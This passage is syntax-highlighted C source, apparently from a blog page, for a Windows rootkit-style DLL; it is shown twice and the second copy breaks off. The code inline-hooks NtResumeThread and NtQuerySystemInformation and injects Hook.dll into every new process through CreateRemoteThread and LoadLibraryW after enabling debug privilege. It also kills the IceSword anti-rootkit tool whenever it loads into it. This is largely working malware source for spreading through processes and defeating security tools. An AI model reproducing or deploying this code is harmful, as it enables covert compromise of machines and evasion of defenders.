pfnThreadRtn = (PTHREAD_START_ROUTINE)</span><br><span class="line">         GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;Kernel32&quot;</span>)), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"></span><br><span class="line">    HANDLE hRemoteThread = CreateRemoteThread(hProcess,</span><br><span class="line">                                                      <span class="literal">NULL</span>,</span><br><span class="line">                                                      <span class="number">0</span>,</span><br><span class="line">                                                      pfnThreadRtn,</span><br><span class="line">                                                      pszLibFileRemote,</span><br><span class="line">                                                      <span class="number">0</span>,</span><br><span class="line">                                                      <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(hRemoteThread, INFINITE);</span><br><span class="line">    CloseHandle(hRemoteThread);</span><br><span class="line"></span><br><span class="line">    EnableDebugPrivilege(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS __stdcall <span class="title function_">NewNtResumeThread</span><span class="params">(IN HANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">OUT PULONG PreviousSuspendCount OPTIONAL)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    NTSTATUS ret;</span><br><span class="line">    NTSTATUS nStatus;</span><br><span class="line">    NTQUERYSYSTEMINFORMATION NtQuerySystemInformation;</span><br><span class="line">    NTQUERYINFORMATIONTHREAD NtQueryInformationThread = <span class="literal">NULL</span>;</span><br><span class="line">    THREAD_BASIC_INFORMATION ti;</span><br><span class="line">    DWORD Pid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    HMODULE hNtdll = GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll,</span><br><span class="line">                                                             <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line">    NtQueryInformationThread = (NTQUERYINFORMATIONTHREAD)GetProcAddress(hNtdll,</span><br><span class="line">                                                             <span class="string">&quot;NtQueryInformationThread&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NtQueryInformationThread == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, <span class="string">&quot;can&#x27;t get NtQueryInformationThread&quot;</span>, <span class="string">&quot;&quot;</span>, MB_OK);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nStatus = NtQueryInformationThread(ThreadHandle,</span><br><span class="line">                                           ThreadBasicInformation,</span><br><span class="line">                                           (PVOID)&amp;ti,</span><br><span class="line">                       <span class="keyword">sizeof</span>(THREAD_BASIC_INFORMATION),</span><br><span class="line">                                           <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(nStatus != STATUS_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, <span class="string">&quot;fuck failed&quot;</span>, <span class="string">&quot;&quot;</span>, MB_OK);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Pid = (DWORD)(ti.ClientId.UniqueProcess);</span><br><span class="line"></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, Pid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, <span class="string">&quot;open process failed&quot;</span>, <span class="string">&quot;&quot;</span>, MB_OK);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BYTE FirstByte[<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">// check if the process has been hooked</span></span><br><span class="line">    ReadProcessMemory(hProcess, NtQuerySystemInformation, FirstByte, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 已经被Hook了</span></span><br><span class="line">    <span class="keyword">if</span> ( FirstByte[<span class="number">0</span>] == <span class="number">0xe9</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">       HookOff();</span><br><span class="line">       ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount);</span><br><span class="line">       HookOn();</span><br><span class="line"></span><br><span class="line">       CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建新进程的调用，Hook 之</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        HookOff();</span><br><span class="line">        inject(hProcess);</span><br><span class="line">        ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount);</span><br><span class="line">        HookOn();</span><br><span class="line"></span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS __stdcall <span class="title function_">NewNtQuerySystemInformation</span><span class="params">(</span></span><br><span class="line"><span class="params">            IN ULONG SystemInformationClass,</span></span><br><span class="line"><span class="params">            IN PVOID SystemInformation,</span></span><br><span class="line"><span class="params">            IN ULONG SystemInformationLength,</span></span><br><span class="line"><span class="params">            OUT PULONG ReturnLength)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS ntStatus;</span><br><span class="line"></span><br><span class="line">    HookOff();</span><br><span class="line">    ntStatus = g_pfNtQuerySystemInformation(SystemInformationClass,</span><br><span class="line">                                                SystemInformation,</span><br><span class="line">                                                SystemInformationLength,</span><br><span class="line">                                                ReturnLength);</span><br><span class="line">    HookOn();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> ntStatus;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> WINAPI <span class="title function_">HookOn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    PMEMORY_BASIC_INFORMATION lpAllocBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwOldProtect, dwOldProtect2;</span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    dwIdOld = GetCurrentProcessId();</span><br><span class="line">    hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, dwIdOld);</span><br><span class="line">    <span class="keyword">if</span>(hProcess == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line">     HMODULE hNtdll = GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">     g_pfNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll,</span><br><span class="line">                                                    <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (g_pfNtQuerySystemInformation == <span class="literal">NULL</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     g_pfNtResumeThread = (NTRESUMETHREAD)GetProcAddress(hNtdll, <span class="string">&quot;NtResumeThread&quot;</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (g_pfNtResumeThread == <span class="literal">NULL</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     EnterCriticalSection(&amp;cs);</span><br><span class="line"></span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        lea edi,g_OldNtQuerySystemInformation</span><br><span class="line">        mov esi,g_pfNtQuerySystemInformation</span><br><span class="line">        cld</span><br><span class="line">        mov ecx,<span class="number">5</span></span><br><span class="line">        rep movsb</span><br><span class="line">        lea edi,g_OldNtResumeThread</span><br><span class="line">        mov esi,g_pfNtResumeThread</span><br><span class="line">        cld</span><br><span class="line">        mov ecx,<span class="number">5</span></span><br><span class="line">        rep movsb</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    g_NewNtQuerySystemInformation[<span class="number">0</span>] = <span class="number">0xe9</span>;</span><br><span class="line">    g_NewNtResumeThread[<span class="number">0</span>] = <span class="number">0xe9</span>;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        lea eax, NewNtQuerySystemInformation</span><br><span class="line">        mov ebx, g_pfNtQuerySystemInformation</span><br><span class="line">        sub eax, ebx</span><br><span class="line">        sub eax, <span class="number">5</span></span><br><span class="line">        mov dword ptr [g_NewNtQuerySystemInformation + <span class="number">1</span>], eax</span><br><span class="line">        lea eax, NewNtResumeThread</span><br><span class="line">        mov ebx, g_pfNtResumeThread</span><br><span class="line">        sub eax, ebx</span><br><span class="line">        sub eax, <span class="number">5</span></span><br><span class="line">        mov dword ptr [g_NewNtResumeThread + <span class="number">1</span>], eax</span><br><span class="line">    &#125;</span><br><span class="line">    .......</span><br><span class="line">    LeaveCriticalSection(&amp;cs);</span><br><span class="line"></span><br><span class="line">    g_bHook = TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还原被修改的代码</span></span><br><span class="line"><span class="type">void</span> WINAPI <span class="title function_">HookOff</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    g_bHook = FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br>BOOL g_bHook = FALSE;<br><br><span class="hljs-keyword">typedef</span> LONG NTSTATUS;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS               ((NTSTATUS)0x00000000L)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_ACCESS_DENIED         ((NTSTATUS)0xC0000022L)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L)</span><br><span class="hljs-keyword">typedef</span> ULONG SYSTEM_INFORMATION_CLASS;<br><span class="hljs-keyword">typedef</span> ULONG THREADINFOCLASS;<br><span class="hljs-keyword">typedef</span> ULONG PROCESSINFOCLASS;<br><span class="hljs-keyword">typedef</span> ULONG KPRIORITY;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMORY_BASIC_INFORMATION_SIZE 28</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">THREAD_BASIC_INFORMATION</span> &#123;</span><br>    NTSTATUS ExitStatus;<br>    PNT_TIB TebBaseAddress;<br>    CLIENT_ID ClientId;<br>    KAFFINITY AffinityMask;<br>    KPRIORITY Priority;<br>    KPRIORITY BasePriority;<br>&#125; THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PROCESS_BASIC_INFORMATION</span> &#123;</span> <span class="hljs-comment">// Information Class 0</span><br>NTSTATUS ExitStatus;<br>PVOID PebBaseAddress;<br>KAFFINITY AffinityMask;<br>KPRIORITY BasePriority;<br>ULONG UniqueProcessId;<br>ULONG InheritedFromUniqueProcessId;<br>&#125; PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall *NTQUERYSYSTEMINFORMATION)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="hljs-params">  OUT PVOID               SystemInformation,</span><br><span class="hljs-params">  IN ULONG                SystemInformationLength,</span><br><span class="hljs-params">  OUT PULONG              ReturnLength OPTIONAL )</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall *NTRESUMETHREAD)</span><span class="hljs-params">(</span><br><span class="hljs-params">IN HANDLE ThreadHandle,</span><br><span class="hljs-params">OUT PULONG PreviousSuspendCount OPTIONAL</span><br><span class="hljs-params">)</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall *NTQUERYINFORMATIONTHREAD)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN HANDLE ThreadHandle,</span><br><span class="hljs-params">  IN THREADINFOCLASS ThreadInformationClass,</span><br><span class="hljs-params">  OUT PVOID ThreadInformation,</span><br><span class="hljs-params">  IN ULONG ThreadInformationLength,</span><br><span class="hljs-params">  OUT PULONG ReturnLength OPTIONAL)</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall * NTQUERYINFORMATIONPROCESS)</span><span class="hljs-params">(</span><br><span class="hljs-params">IN HANDLE ProcessHandle,</span><br><span class="hljs-params">IN PROCESSINFOCLASS ProcessInformationClass,</span><br><span class="hljs-params">OUT PVOID ProcessInformation,</span><br><span class="hljs-params">IN ULONG ProcessInformationLength,</span><br><span class="hljs-params">OUT PULONG ReturnLength OPTIONAL)</span>;<br><br><br>NTQUERYSYSTEMINFORMATION g_pfNtQuerySystemInformation = <span class="hljs-literal">NULL</span>;<br>NTRESUMETHREAD g_pfNtResumeThread = <span class="hljs-literal">NULL</span>;<br>BYTE g_OldNtQuerySystemInformation[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;, g_NewNtQuerySystemInformation[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>BYTE g_OldNtResumeThread[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;, g_NewNtResumeThread[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>DWORD dwIdOld = <span class="hljs-number">0</span>;<br>CRITICAL_SECTION cs;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">NewNtQuerySystemInformation</span><span class="hljs-params">(</span><br><span class="hljs-params">            IN ULONG SystemInformationClass,</span><br><span class="hljs-params">            IN PVOID SystemInformation,</span><br><span class="hljs-params">            IN ULONG SystemInformationLength,</span><br><span class="hljs-params">            OUT PULONG ReturnLength)</span>;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">NewNtResumeThread</span><span class="hljs-params">(IN HANDLE ThreadHandle,</span><br><span class="hljs-params">OUT PULONG PreviousSuspendCount OPTIONAL)</span>;<br><br><br><span class="hljs-type">void</span> WINAPI <span class="hljs-title function_">HookOn</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> WINAPI <span class="hljs-title function_">HookOff</span><span class="hljs-params">()</span>;<br><br>BOOL APIENTRY <span class="hljs-title function_">DllMain</span><span class="hljs-params">( HANDLE hModule,</span><br><span class="hljs-params">                       DWORD  ul_reason_for_call,</span><br><span class="hljs-params">                       LPVOID lpReserved )</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        &#123;<br>             InitializeCriticalSection(&amp;cs);<br>             <span class="hljs-type">char</span> Name[MAX_PATH] = &#123;<span class="hljs-number">0</span>&#125;;<br>             GetModuleFileName(<span class="hljs-literal">NULL</span>, Name, MAX_PATH);<br>             <span class="hljs-comment">// 杀杀冰刃玩玩</span><br>             <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strstr</span>(Name, <span class="hljs-string">&quot;IceSword.exe&quot;</span>) != <span class="hljs-literal">NULL</span>)<br>             &#123;<br>                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,<br>                                              <span class="hljs-number">0</span>,<br>                                              GetCurrentProcessId());<br>                TerminateProcess(hProcess, <span class="hljs-number">0</span>);<br>                CloseHandle(hProcess);<br>             &#125;<br>            <span class="hljs-keyword">if</span>(!g_bHook)<br>            &#123;<br>                HookOn();<br>            &#125;<br>            <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>               MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Process Attach&quot;</span>, <span class="hljs-string">&quot;Remote Dll&quot;</span>, MB_OK);<br>            <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>        &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">if</span>(g_bHook)<br>        &#123;<br>            HookOff();<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>            MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Off!&quot;</span>, <span class="hljs-string">&quot;Hook Off&quot;</span>, MB_OK);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            DeleteCriticalSection(&amp;cs);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>        <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br>BOOL <span class="hljs-title function_">EnableDebugPrivilege</span><span class="hljs-params">(BOOL fEnable)</span> &#123;<br><br>   <span class="hljs-comment">// Enabling the debug privilege allows the application to see</span><br>   <span class="hljs-comment">// information about service applications</span><br>   BOOL fOk = FALSE;    <span class="hljs-comment">// Assume function fails</span><br>   HANDLE hToken;<br><br>   <span class="hljs-comment">// Try to open this process&#x27;s access token</span><br>   <span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,<br>      &amp;hToken)) &#123;<br><br>      <span class="hljs-comment">// Attempt to modify the &quot;Debug&quot; privilege</span><br>      TOKEN_PRIVILEGES tp;<br>      tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>      LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="hljs-number">0</span>].Luid);<br>      tp.Privileges[<span class="hljs-number">0</span>].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : <span class="hljs-number">0</span>;<br>      AdjustTokenPrivileges(hToken, FALSE, &amp;tp, <span class="hljs-keyword">sizeof</span>(tp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>      fOk = (GetLastError() == ERROR_SUCCESS);<br>      CloseHandle(hToken);<br>   &#125;<br>   <span class="hljs-keyword">return</span>(fOk);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ThreadBasicInformation 0</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">(HANDLE hProcess)</span>&#123;<br><br>    <span class="hljs-type">char</span> CurPath[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    GetSystemDirectory(CurPath, <span class="hljs-number">256</span>);<br>    <span class="hljs-built_in">strncat</span>(CurPath, <span class="hljs-string">&quot;\\Hook.dll&quot;</span>, <span class="hljs-number">9</span>);<br>    <span class="hljs-comment">//strcpy(CurPath, &quot;C:\\WINDOWS\\system32\\Hook.dll&quot;);</span><br>    PWSTR pszLibFileRemote = <span class="hljs-literal">NULL</span>;<br><br><br>    <span class="hljs-type">int</span> len = (lstrlen(CurPath)+<span class="hljs-number">1</span>)*<span class="hljs-number">2</span>;<br>    WCHAR wCurPath[<span class="hljs-number">256</span>];<br>    MultiByteToWideChar(CP_ACP,<span class="hljs-number">0</span>,CurPath,<span class="hljs-number">-1</span>,wCurPath,<span class="hljs-number">256</span>);<br><br>    EnableDebugPrivilege(<span class="hljs-number">1</span>);<br><br>    pszLibFileRemote = (PWSTR)<br>        VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, len, MEM_COMMIT, PAGE_READWRITE);<br><br>    WriteProcessMemory(hProcess, pszLibFileRemote,<br>        (PVOID) wCurPath, len, <span class="hljs-literal">NULL</span>);<br><br>    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)<br>         GetProcAddress(GetModuleHandle(TEXT(<span class="hljs-string">&quot;Kernel32&quot;</span>)), <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><br>    HANDLE hRemoteThread = CreateRemoteThread(hProcess,<br>                                                      <span class="hljs-literal">NULL</span>,<br>                                                      <span class="hljs-number">0</span>,<br>                                                      pfnThreadRtn,<br>                                                      pszLibFileRemote,<br>                                                      <span class="hljs-number">0</span>,<br>                                                      <span class="hljs-literal">NULL</span>);<br>    WaitForSingleObject(hRemoteThread, INFINITE);<br>    CloseHandle(hRemoteThread);<br><br>    EnableDebugPrivilege(<span 